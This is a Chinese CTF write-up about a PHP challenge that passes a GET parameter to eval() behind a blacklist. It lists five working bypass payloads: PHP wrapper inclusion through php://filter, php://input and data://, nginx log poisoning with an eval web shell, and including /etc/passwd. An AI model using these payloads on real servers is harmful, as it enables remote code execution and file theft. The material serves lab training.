```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 02:22:27
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
//
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

同上一题



## 第一种

利用命令执行及文件包含

```
?c=include%0a$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20250309095114995](./assets/image-20250309095114995.png)

![image-20250309095116831](./assets/image-20250309095116831.png)



## 第二种

也可以利用php://input执行系统命令

```
?c=include$_GET[a]?>&a=php://input
POST提交：
<?php system("cat flag.php");?>
```

![image-20250309095206485](./assets/image-20250309095206485.png)



## 第三种

也可以用data://text/plain

```
?c=include$_GET[a]?>&a=data://text/plain,<?php system("cat flag.php");?>
```

![image-20250309095256362](./assets/image-20250309095256362.png)



## 第四种

日志注入

```
ra<?php @eval($_POST[a]);?>
```

![image-20250402181301010](./assets/image-20250402181301010.png)

![image-20250402181313421](./assets/image-20250402181313421.png)

GET

```
?c=include$_GET[a]?>&a=../../../../var/log/nginx/access.log
```

POST

```
a=system("cat flag.php");
```

![image-20250402181352068](./assets/image-20250402181352068.png)



## 第五种

利用require进行文件包含

```
?c=require$_GET[a]?>&a=/etc/passwd
```

![image-20250402184256928](./assets/image-20250402184256928.png)

成功包含/etc/passwd

也就是可以利用前面的四种做法来做